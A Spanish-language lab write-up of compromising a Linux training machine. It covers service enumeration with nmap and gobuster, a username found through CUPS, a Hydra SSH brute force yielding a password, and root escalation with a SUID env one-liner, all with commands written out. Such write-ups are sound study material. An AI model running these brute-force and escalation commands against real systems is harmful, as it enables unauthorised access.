# Basic

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux obteniendo credenciales a partir de la enumeración de los servicios expuestos, acceder mediante **SSH** y escalar privilegios explotando un binario **SUID** hasta conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- SSH
- Hydra
- CUPS (IPP)
- Gobuster
- Dirb
- SUID
- GTFOBins

---

## 🧠 Metodología

La enumeración inicial reveló tres servicios: **SSH**, **HTTP** y **CUPS (IPP)**. Aunque la página web no mostraba información relevante, la presencia del servicio de impresión llamó la atención porque suele exponer información sobre usuarios y configuración del sistema.

En lugar de insistir sobre la aplicación web, decidí investigar el servicio CUPS. Durante esta fase apareció un nombre de usuario válido, suficiente para plantear un ataque de fuerza bruta contra SSH. Esta decisión permitió obtener acceso al sistema sin necesidad de explotar ninguna vulnerabilidad en el servidor web.

Una vez dentro de la máquina, la prioridad pasó a ser la escalada de privilegios. La enumeración mediante `sudo` no ofreció ninguna posibilidad, por lo que recurrí a la búsqueda de binarios SUID. Finalmente, un binario vulnerable documentado en GTFOBins permitió obtener una shell con privilegios de **root**.

Este laboratorio demuestra la importancia de enumerar todos los servicios expuestos, incluso aquellos que a menudo pasan desapercibidos, como los relacionados con la impresión.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé identificando la dirección IP de la máquina mediante `arp-scan` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido con `ping`.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 192.168.1.25
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | Apache HTTP |
| 631 | CUPS (IPP) |

---

### 2. Enumeración de servicios

La página web alojada en el puerto **80** únicamente mostraba la página por defecto de Apache.

Tras revisar el código fuente sin encontrar información relevante, realicé una enumeración de directorios mediante Gobuster.

```bash
gobuster dir -u http://192.168.1.25 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

El único recurso interesante encontrado fue:

```
/server-status
```

Sin embargo, el acceso estaba restringido.

También realicé una enumeración adicional utilizando Dirb.

```bash
dirb http://192.168.1.25
```

Los resultados no aportaron nueva información útil.

A continuación investigué el servicio **CUPS** disponible en el puerto **631**.

Durante la navegación por la interfaz encontré el nombre del usuario:

```
dimitri
```

---

### 3. Obtención del acceso inicial

Con el usuario identificado lancé un ataque de fuerza bruta sobre el servicio SSH utilizando Hydra.

```bash
hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.25
```

El ataque devolvió las siguientes credenciales:

```
dimitri:mememe
```

Con ellas inicié sesión mediante SSH.

```bash
ssh dimitri@192.168.1.25
```

Una vez autenticado localicé la primera flag:

```
user.txt
```

---

### 4. Enumeración interna

Comencé revisando los usuarios existentes.

```bash
cat /etc/passwd
```

El sistema únicamente disponía de dos usuarios relevantes:

- root
- dimitri

Posteriormente comprobé los permisos disponibles mediante:

```bash
sudo -l
```

No existían permisos interesantes.

Por ello inicié una búsqueda de binarios SUID.

```bash
find / -perm -4000 2>/dev/null
```

---

### 5. Escalada de privilegios

Durante la enumeración apareció el siguiente binario:

```
/usr/bin/env
```

Consultando GTFOBins comprobé que era posible utilizarlo para conservar privilegios elevados.

Ejecuté:

```bash
/usr/bin/env /bin/bash -p
```

Tras ello obtuve una shell como **root**.

Finalmente accedí al directorio:

```
/root
```

y recuperé la última flag del laboratorio.

---

## 📚 Lecciones aprendidas

- Este laboratorio reforzó la importancia de realizar una enumeración completa de todos los servicios expuestos antes de comenzar a buscar vulnerabilidades complejas.
- Enumerar servicios de impresión **CUPS (IPP)**.
- Obtener nombres de usuario a partir de servicios auxiliares.
- Utilizar Hydra para realizar ataques de fuerza bruta sobre SSH.
- Identificar usuarios válidos antes de lanzar ataques de diccionario.
- Buscar binarios **SUID** tras obtener acceso inicial.
- Escalar privilegios utilizando el binario `env` documentado en GTFOBins.

### Reflexión

La principal enseñanza de esta máquina fue comprender que los servicios secundarios también pueden proporcionar información crítica durante una auditoría. En este caso, la aplicación web apenas ofrecía información útil, mientras que el servicio **CUPS** permitió descubrir un usuario válido que facilitó completamente el acceso inicial mediante fuerza bruta. Además, el laboratorio reforzó la importancia de revisar siempre los binarios SUID tras obtener acceso al sistema, ya que siguen siendo uno de los mecanismos de escalada de privilegios más habituales en entornos Linux.
